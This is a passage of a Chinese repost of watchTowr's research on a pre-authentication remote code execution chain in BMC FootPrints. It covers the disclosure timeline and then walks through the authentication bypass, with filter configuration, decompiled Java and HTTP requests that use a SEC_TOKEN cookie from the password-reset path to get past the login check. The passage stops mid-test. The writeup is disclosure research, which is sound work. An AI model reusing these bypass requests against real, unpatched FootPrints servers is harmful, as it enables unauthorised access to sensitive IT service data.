#  BMC FootPrints 预认证远程代码执行漏洞链分析  
watchTowr
                    watchTowr  赛博知识驿站   2026-03-20 02:45  
  
   
  
![一篇关于](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU2v36hp8swB2MoS63VV2mhJtXgKRiaIwhQpqVZEKRyO4T04MzcC6wjeNXjlqLooT8ria2mkKp7dzEHUqkUbnzcoljPFXAGs2IfuI/640?wx_fmt=png&from=appmsg "")  
  
一篇关于 `BMC FootPrints` 预认证远程代码执行漏洞链的技术研究封面图  
  
SolarWinds  
、Ivanti  
、SysAid  
、ManageEngine  
。这些名字，放到 KEV  
 世界里，几乎个个都是“老熟人”。而一个很耐人寻味的共性是：它们都多少沾点 ITSM  
 业务。  
  
ITSM  
 这类系统，说白了，从来不只是“跑在服务器上的一套代码”那么简单。它们往往掌握着企业内部最敏感、最完整、也最有条理的信息：资产清单、配置文件、工单记录、故障报告、变更历史……对勒索组织和高阶攻击者来说，这不是系统，这是作战地图；不是后台，这是指挥中心。  
  
所以，攻击者越来越“有组织”，并不只是因为他们手法老练，更是因为企业自己把最核心的情报，整整齐齐地摆进了 ITSM  
 里。  
  
而这一次，被盯上的，是 BMC FootPrints  
。  
  
**BMC FootPrints 上一次拿到 CVE，还是 2014 年。今天，这个纪录被改写了。**  
watchTowr  
 从自家档案库里翻出了一段 2025 年的研究：当时面对的是“已完全打补丁”的 BMC FootPrints  
，最终他们通过一串漏洞组合拳，打到了**预认证远程代码执行**  
。  
### 什么是 BMC FootPrints？  
  
BMC FootPrints  
 是一套典型的 IT Service Management  
（ITSM  
）解决方案，面向 IT  
 团队，用来处理服务请求、事件、资产、变更等工作流，主打可配置流程和 Web 管理界面。  
  
如果按厂商宣传口径，它大概包含这些“让人热血沸腾”的功能：  
- • 工单管理  
  
- • 事件跟踪  
  
- • 工作流自动化  
  
- • 资产管理  
  
- • 报表  
  
- • 以及更多  
  
BMC  
 在 ITSM  
 上其实有两条产品线：  
- • Helix  
  
- • FootPrints  
  
相比之下，FootPrints  
 一直算低调——至少在公开漏洞记录上是如此。产品本身上一次 CVE  
 还停留在 2014 年。（CVE-2025-24813  
 是 Tomcat  
 的，不要硬算在它头上。）  
  
但问题来了：**“长期没有 CVE”到底说明它安全，还是说明它没被认真翻过？**  
  
如果再结合一位用户在 HackForums  
 上留下的评论，味道就更不对了：  
> “BMC Footprints  
 整体来说一直挺稳。我们用了几年，最近从 V11  
 升级，正在往 V12  
 迁移。听说 V12  
 是完全重写版，体验应该会更好，因为终于不再用那套过时语言，也不再严重依赖 JRE  
。但让人失望的是，V11  
 不能直接平滑升级到 V12  
。”  
  
  
看到这里，懂的人基本都懂了。  
  
“完全重写”“老旧语言”“重度依赖 JRE  
”“不能直接升级”——这些关键词凑到一起，往往不是什么岁月静好，而是一个经典信号：**旧系统里，可能埋着不小的坑。**  
### 这次 watchTowr 又干了什么？  
  
长话短说，这篇文章拆解的是 4 个独立漏洞，以及它们如何被一步步串成一条完整利用链：  
- • CVE-2025-71257  
 / WT-2025-0069  
 - 认证绕过  
  
- • CVE-2025-71258  
 / WT-2025-0070  
 - 服务端请求伪造（SSRF  
）  
  
- • CVE-2025-71259  
 / WT-2025-0071  
 - 服务端请求伪造（SSRF  
）  
  
- • CVE-2025-71260  
 / WT-2025-0072  
 - 不可信数据反序列化（RCE  
）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU2fRkPibmzUah1ksWamqWtp44yL7OuPC0xXD3mr7fGKGCGQ2z9d9NIJwO8pzKujUcXBI5vrLrr4WogyvRO9IpN1R2iaelVjnYLzA/640?wx_fmt=png&from=appmsg "")  
  
受影响版本范围如下：  
- • BMC FootPrints 20.20.02  
 到 20.24.01.001  
  
### 漫长到像写在羊皮纸上的披露时间线  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf=""><br/></span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf=""><br/></span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Date</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Detail</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">6th June 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">watchTowr</span></code><section><span leaf=""> 向 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">BMC</span></code><span leaf=""> 披露 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">WT-2025-0069</span></code><span leaf="">、</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">WT-2025-0070</span></code><span leaf="">、</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">WT-2025-0071</span></code><span leaf="">、</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">WT-2025-0072</span></code></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">6th June 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">watchTowr</span></code><section><span leaf=""> 开始在客户暴露面中排查相关资产</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">9th June 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">watchTowr</span></code><section><span leaf=""> 向 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">BMC</span></code><span leaf=""> 提供 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">Aspectjweaver</span></code><span leaf=""> 的 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">RCE gadget</span></code></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">12th June 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">BMC</span></code><section><span leaf=""> 确认已收到报告</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">16th June 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">BMC</span></code><section><span leaf=""> 表示除 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">WT-2025-0072</span></code><span leaf="">（</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">RCE</span></code><span leaf="">）外，其余漏洞已成功复现，并请求更多信息</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">20th June 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">watchTowr</span></code><section><span leaf=""> 提供一个“点点点就能跑”的 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">Python PoC</span></code><span leaf="">，用于复现认证绕过（</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">WT-2025-0069</span></code><span leaf="">）和远程代码执行链（</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">WT-2025-0072</span></code><span leaf="">）</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">20th June 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">BMC</span></code><section><span leaf=""> 表示已收到 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">PoC</span></code><span leaf="">，后续反馈</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">1st July 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">watchTowr</span></code><section><span leaf=""> 追问 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">RCE</span></code><span leaf=""> 复现进度</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">3rd July 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">BMC</span></code><section><span leaf=""> 表示 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">RCE</span></code><span leaf=""> 复现存在问题，请求更多环境说明</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">3rd July 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">watchTowr</span></code><section><span leaf=""> 提供漏洞利用链截图证据</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">4th July 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">BMC</span></code><section><span leaf=""> 请求 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">watchTowr</span></code><span leaf=""> 环境中的 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">web.xml</span></code><span leaf=""> 哈希</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">5th July 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">watchTowr</span></code><section><span leaf=""> 提供多个文件哈希，包括 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">FootPrints</span></code><span leaf=""> 安装程序</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">18th July 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">watchTowr</span></code><section><span leaf=""> 再次催更</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">1st August 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">watchTowr</span></code><section><span leaf=""> 再次催更</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">29th August 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">BMC</span></code><section><span leaf=""> 表示邮件沟通出了点问题，稍后回复</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">2nd September 2025</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">BMC</span></code><section><span leaf=""> 表示已成功复现 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">RCE</span></code><span leaf="">，4 个问题均已修复。热修复版本：</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">20.20.02</span></code><span leaf="">、</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">20.20.03.002</span></code><span leaf="">、</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">20.21.01.001</span></code><span leaf="">、</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">20.21.02.002</span></code><span leaf="">、</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">20.22.01</span></code><span leaf="">、</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">20.22.01.001</span></code><span leaf="">、</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">20.23.01</span></code><span leaf="">、</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">20.23.01.002</span></code><span leaf="">、</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">20.24.01</span></code></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">2nd March 2026</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">分配 </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">CVE</span></code><span leaf="">：</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">CVE-2025-71257</span></code><span leaf=""> / </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">WT-2025-0069</span></code><span leaf="">：认证绕过；</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">CVE-2025-71258</span></code><span leaf=""> / </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">WT-2025-0070</span></code><span leaf="">：</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">SSRF</span></code><span leaf="">；</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">CVE-2025-71259</span></code><span leaf=""> / </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">WT-2025-0071</span></code><span leaf="">：</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">SSRF</span></code><span leaf="">；</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">CVE-2025-71260</span></code><span leaf=""> / </span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">WT-2025-0072</span></code><span leaf="">：不可信数据反序列化（</span><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">RCE</span></code><span leaf="">）</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">18th March 2026</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">watchTowr</span></code><section><span leaf=""> 终于想起这篇文章还没发，流下了复杂的泪水，然后发布研究</span></section></td></tr></tbody></table>  
  
一句话总结：这条时间线，看着都让人叹气。  
### 回到故事本身  
  
和所有研究一样，watchTowr  
 给自己设定了一个“明确、独特、富有创造力”的目标——并且在达成之前，拒绝加餐。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU0kmJa4icdy12tfjnhSG7Ed11JAFLiaqSd92Uf0sSkcQ1U1ibAS6N96iaj447Wq79IMS1LewEl0ibtxodauHEFE7QdZBBMqibrPianicIE/640?wx_fmt=png&from=appmsg "")  
- • 能不能打到远程代码执行？  
  
- • 能不能打到远程代码执行？  
  
- • 能不能打到远程代码执行？  
  
- • 能不能打到远程代码执行？  
  
- • **能不能在不登录的前提下，直接打到远程代码执行？**  
  
这才是重点。  
### 开始下潜  
  
BMC FootPrints  
 可以很轻松地安装在 Windows Server  
 上。装好以后，浏览器会自动打开主入口：  
  
http://127.0.0.1:8080/footprints/servicedesk[1]  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU2xCBNqfTpaJT4KuJDPsdkmcboHcpw0mXvkXU1sT9J0ib9ZAhFL1eYAVAxVxOZjqNpS2cpYnA6wFiawbDtiayiamZrtFAzrRic7XIdQ/640?wx_fmt=png&from=appmsg "")  
  
配套的 Apache Tomcat  
 安装在独立目录：  
  
C:\\Program Files\\Apache Software Foundation\\Tomcat 9.0  
  
而真正展开后的应用 war  
 文件，也就是应用源码所在目录，则在：  
  
C:\\Program Files\\BMC Software\\FootPrints\\web  
  
对于做过 Tomcat  
 逆向的人来说，这套结构并不陌生：  
- • web.xml  
 定义 servlet  
 路由  
  
- • jsp  
 作为服务端脚本执行  
  
- • jar  
 和 class  
 文件则是背后的编译后 Java 代码  
  
为了避免后面卡壳，他们一开始就把文件全量抽出来，方便反编译和远程调试。这个动作很朴素，但往往是化繁为简、事半功倍的关键。  
### 认证绕过 - CVE-2025-71257 / WT-2025-0069  
  
当他们尝试直接访问 Web 根目录下的 jsp  
 文件时，很快发现系统前面套了一层过滤器：所有请求都会被重定向到登录页。  
  
下面是一个未认证请求的例子：  
```
GET /footprints/servicedesk/watchTowr HTTP/1.1Host: {{Hostname}}
```  
```
HTTP/1.1 302 Cache-Control: privateSet-Cookie: JSESSIONID=9CAD4CA3D09E640B4AE3DCDCE2116B47; Path=/footprints/servicedesk; HttpOnlyX-XSS-Protection: 1; mode=blockX-Frame-Options: SAMEORIGINX-Content-Type-Options: nosniffLocation: http://{{Hostname}}:8080/footprints/servicedesk/login.htmlContent-Length: 0Date: Tue, 17 Jun 2025 08:36:00 GMT
```  
  
这个行为非常像一个白名单过滤器。也就是说，系统很可能在别处定义了一套类似正则的匹配逻辑：哪些路径可以在未认证下访问，哪些不行。  
  
很快，线索被追到了：  
  
deployment/non-version-specific/conf/footprints-application-beans.xml  
  
在这里，能看到一个拦截所有 URI 的过滤规则 /**  
：  
```
    <!-- Restrict access to ALL other pages -->    <security:intercept-url pattern="/**"      access="isAuthenticated()" requires-channel="any" />
```  
  
这个文件里一共有 **58 条过滤规则**  
。说实话，这不是小工程。尤其有些还是通配规则，攻击面被拉得更宽，分析起来很容易掉进细枝末节里绕不出来。  
  
从“登录后”的视角看，攻击面不小；但在“未登录”的前提下，一切都被最前面的 isAuthenticated()  
 卡死了。哪怕某些 servlet  
 已经在 web.xml  
 里声明了，没有认证，理论上也摸不到。  
  
典型过滤器长这样：  
```
<!-- Survey FILTER CHAIN Definition -->  <security:http pattern="/survey/**" auto-config="false" use-expressions="true" disable-url-rewriting="false"    entry-point-ref="defaultAuthenticationEntryPoint" security-context-repository-ref="securityContextRepository">       <security:headers>         <security:frame-options disabled="true"></security:frame-options>    </security:headers>        <!-- Restrict access to Portal -->    <security:intercept-url pattern="/survey/**"      access="isAuthenticated()" requires-channel="any" />    <!-- Disabling session fixation protection allows to use custom session management-->    <security:session-management session-fixation-protection="none"/>        <security:csrf disabled="true"/>        <!-- Custom authentication filters -->    <security:custom-filter before="ANONYMOUS_FILTER" ref="surveyAuthenticationFilter"/>    <security:custom-filter before="SECURITY_CONTEXT_FILTER" ref="systemSecurityContextPersistenceFilter" />    <security:custom-filter after="SESSION_MANAGEMENT_FILTER" ref="customSystemSessionManagementFilter" />    <security:custom-filter position="LOGOUT_FILTER" ref="logoutFilter" />  </security:http>    <!-- Portal FILTER CHAIN Definition -->  <security:http pattern="/portal/set/**" auto-config="false" use-expressions="true" disable-url-rewriting="false" <--- [0]    entry-point-ref="defaultAuthenticationEntryPoint" security-context-repository-ref="securityContextRepository">       <security:headers>         <security:frame-options disabled="true"></security:frame-options>    </security:headers>    <!-- Restrict access to Portal -->    <security:intercept-url pattern="/portal/set/**"      access="isAuthenticated()" requires-channel="any" />
```  
  
看 [0]  
 这一段可以发现，匹配 /portal/set/**  
 的请求会进入 securityContextRepository  
 过滤链。换句话说，**它可能在预认证状态下也会经过某些特殊逻辑。**  
  
既然可达面有限，那就别想走捷径了——一个个试。一个个点。一个个比对差异。  
  
这是个笨办法，但在复杂安全过滤链面前，笨办法往往是最有用的办法。因为很多时候，真正的突破口，不是灵光乍现，而是“地毯式”试出来的。  
> 这件事真的值得反复强调：面对代码量巨大的企业产品，尤其是这种安全过滤链层层嵌套的系统，研究人员太容易迷失在细节里。很多时候，不是技术不够，而是路径太多、噪音太大。这个时候，最靠谱的反而是老老实实对着活体环境逐个试路由，看哪里行为不一样。  
  
  
最后，绝大多数未认证路径都还是死路一条。  
  
但就在这堆“没戏”的响应里，有一个过滤器跳了出来，格外扎眼：  
```
security:http pattern="/passwordreset/request/**" auto-config="false" use-expressions="true" disable-url-rewriting="false"    entry-point-ref="defaultAuthenticationEntryPoint" security-context-repository-ref="securityContextRepository">   
```  
  
为什么说它扎眼？因为当路径匹配这个模式时，服务器会在响应头里返回一个安全令牌 Cookie：SEC_TOKEN  
。  
```
GET /footprints/servicedesk/passwordreset/request/ HTTP/1.1Host: {{Hostname}}
```  
```
HTTP/1.1 404 Cache-Control: privateSET-COOKIE: SEC_TOKEN=wGCyXHdPS-slXYwxD5&rtjHQ1&Y1xBimP0dEJ-TjOCNMJV-ULL; Domain={{Hostname}}; Path=/footprints/servicedesk/; HttpOnlyX-XSS-Protection: 1; mode=blockX-Content-Type-Options: nosniffContent-Type: text/html;charset=utf-8Content-Language: enContent-Length: 683Date: Tue, 17 Jun 2025 08:37:58 GMT<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title>
```  
  
请注意这个细节：**别的端点都没有返回这个 SEC_TOKEN。**  
  
这就非常值得玩味了。  
  
一个只在特定未认证路径下出现的令牌，到底拿来干什么？它是怎么生成的？更关键的是——它到底能干什么？  
  
顺着代码追下去，他们找到了调用链中的另一个过滤器：  
  
com/numarasoftware/footprints/application/web/filter/GenericGuestAuthenticationFilter.class  
```
 public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {        boolean applyAnonymousForThisRequest = false;        HttpServletRequest request = (HttpServletRequest)req;        HttpServletResponse response = (HttpServletResponse)res;        if (request.getAttribute("__system_guest_filter_applied") != null) {            chain.doFilter(request, response);        } else {            request.setAttribute("__system_guest_filter_applied", Boolean.TRUE);            try {                applyAnonymousForThisRequest = this.applyGuestForThisRequest(request, response); <--- [0]            } catch (AuthenticationException var8) {                AuthenticationException ex = var8;                this._failureHandler.onAuthenticationFailure(request, response, ex);                return;            }            if (!this.isAlreadyLoggedIn()) {                if (!this.hasLoginRequired(request) && applyAnonymousForThisRequest) { <--- [1]                    Authentication authentication = SecurityContextHolder.getContext().getAuthentication();                    if (!SystemSessionContext.hasValidSession()) {                        this.createGuestAuthentication(request, response, authentication); <--- [2]                        LOG.debug("Populated SecurityContextHolder with anonymous token: '" + SecurityContextHolder.getContext().getAuthentication() + "'", new Object[0]);                    } else {                        LOG.debug("SecurityContextHolder not populated with anonymous token because it already contained: '" + authentication + "'", new Object[0]);                    }                } else if (SystemSessionContext.hasValidSession()) {                    SystemSessionInfo sessionInfo = SystemSessionContext.getSessionInfo();                    if (sessionInfo.isGuestUserSession()) {                        this._sessionStrategy.onInvalidAuthentication();                    }                }            }            chain.doFilter(req, res);        }    }
```  
  
这段代码信息量不小：  
- • [0]  
：检查是否对本次请求应用 guest  
 逻辑  
  
- • [1]  
：判断是否无需登录，同时允许匿名/访客上下文  
  
- • [2]  
：最终调用 createGuestAuthentication()  
，创建访客认证上下文  
  
而这个逻辑一共有 5 个实现：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU1dkBLLuC4EVicb6lmwP9YYiazGiaeAPjHgDhsLTRCSOnQMoCHkolhcBeHnW8cwelhWzxSbY88dk0F1ajrZXppjJtY9jf0JNK0Qzk/640?wx_fmt=png&from=appmsg "")  
  
这也就和前面的配置串起来了。回头看过滤链定义，可以发现 passwordResetRequestAuthenticationFilter  
 被显式配置了进去：  
```
    <!-- Restrict access to Portal -->    <security:intercept-url pattern="/passwordreset/request/**"      access="isAuthenticated()" requires-channel="any" />    <!-- Disabling session fixation protection allows to use custom session management-->    <security:session-management session-fixation-protection="none"/>        <security:csrf disabled="true"/>        <!-- Custom authentication filters -->    <security:custom-filter before="ANONYMOUS_FILTER" ref="passwordResetRequestAuthenticationFilter"/>]    <security:custom-filter before="SECURITY_CONTEXT_FILTER" ref="systemSecurityContextPersistenceFilter" />    <security:custom-filter after="SESSION_MANAGEMENT_FILTER" ref="customSystemSessionManagementFilter" />    <security:custom-filter position="LOGOUT_FILTER" ref="logoutFilter" />  </security:http>  
```  
  
也就是说，这个 SEC_TOKEN  
 并不是什么无关紧要的装饰品，它背后是完整的“访客认证”逻辑。  
  
于是，最关键的一步来了：  
**这个 SEC_TOKEN，能不能满足全局的 isAuthenticated() 检查？**  
  
能的话，事情就不是“小瑕疵”，而是**认证边界被直接打穿**  
。  
  
测试请求如下：  
```
GET /footprints/servicedesk/watchTowr HTTP/1.1Host: {{Hostname}}Cookie: SEC_TOKEN=kziK9aCBHIyTtYDt3SNPpN_or+AUyF9GamRWPowwMWKXMF7Rqr
```  
```
